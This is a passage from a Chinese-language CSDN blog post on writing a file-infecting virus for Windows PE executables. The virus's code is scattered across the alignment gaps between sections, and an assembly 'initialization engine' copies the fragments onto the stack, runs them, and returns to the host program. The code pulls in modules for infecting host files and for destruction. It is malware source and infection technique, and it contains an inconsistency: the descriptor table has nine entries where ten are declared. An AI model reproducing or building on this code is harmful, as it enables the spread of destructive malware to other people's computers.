
Virus_Distribution ends

Distribution_Number=0AH

Virus_Distribution<401000h, VirusSize> ;病毒本身第一次编译时，必然和一般程序一样 EOP 默认是 401000h，长度 VirusSize，且没有被分割
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>
Virus_Distribution<0, 0>

分析：这里使用固定十组病毒片段描述符，因为 PE 文件节的个数很少能超过十个。当然也可使用根据文件节数相应调整的描述表，但是这样不但要增加这对病毒描述操作的代码。

### 2. 病毒运行方案

由于代码分成多份，散乱的分布在文件中，怎么能将病毒连接起来运行呢，严格说方法很多，但比较简单可行的有两种方案：

1.  **物理连接**：建立初始化引擎，申请一块连续的空白区域，把按照病毒描述表所有片段按顺序拷贝到哪里，具体方方法 `CreateFileMappingA`，也可抬高堆栈
2.  **逻辑连接**：建立地址转换引擎，根据病毒描述表进行地址转换，让病毒代码逻辑上认为自己运行在连续的内存区域里

引擎设计的注意的问题：
1.  引擎本身不可被分割，插入时应专门为引擎检查，空白区域是否能完整地容纳下引擎代码。
2.  引擎应该尽量小，因为空白区域是由于文件对齐产生的，对齐值默认 `200H`。

举例（汇编）：

```
Start:

;病毒初始化引擎////////////////////////////////
Engine_for_Initialization proc
   push ebp
   mov  ebp,esp         
   sub  esp,VirusStackSize;抬高堆栈
   call Initialize_Virus_Code
Distribution_of_Virus_Code_Table:;病毒代码分布表，使用结构体描述。固定十组，
Distribution_Offset=$-Start
Distribution_Number=0Ah
Virus_Distribution<401000h,VirusSize>  
Virus_Distribution<0,0>  
Virus_Distribution<0,0>  
Virus_Distribution<0,0>  
Virus_Distribution<0,0>  
Virus_Distribution<0,0>  
Virus_Distribution<0,0>  
Virus_Distribution<0,0>  
Virus_Distribution<0,0>  
Initialize_Virus_Code:

   pop  ebx
   xor  eax,eax
   lea  edi,[esp]
Copy_Next_CodeSection:   

   mov  esi,[ebx+eax*(sizeof Virus_Distribution)]
   and  esi,esi
   jz   Initialize_End
   mov  ecx,[ebx+eax*(sizeof Virus_Distribution)+4]  
Copy_Virus_Code:

   lodsb
   stosb
loop Copy_Virus_Code   

   inc  eax
   cmp  eax,0Ah
   jnz  Copy_Next_CodeSection
   Initialize_End:
;跳转到堆栈中的病毒代码,执行完返回宿主程序原入口点
   mov  eax,esp
   add  eax,VirusEngine_Size
   call eax
;跳转到宿主程序   
  Jmp_Host_File:
   jmp  eax  
Engine_for_Initialization endp
VirusEngine_Size =$-Start
;真正的病毒代码/////////////////////////////////////////////////
VirusCode proc uses ebx ecx edx esi edi
 Include Data_and_Relocation.asm
 Include Infect_HostFile.asm
 Include Destory.asm
  mov  eax,Local_HostFile_OEP
  ret
VirusCode endp
VirusSize =$-Start
```

本文来自 CSDN 博客，转载请标明出处：`http://blog.csdn.net/yangbostar/archive/2010/11/27/6039603.aspx`
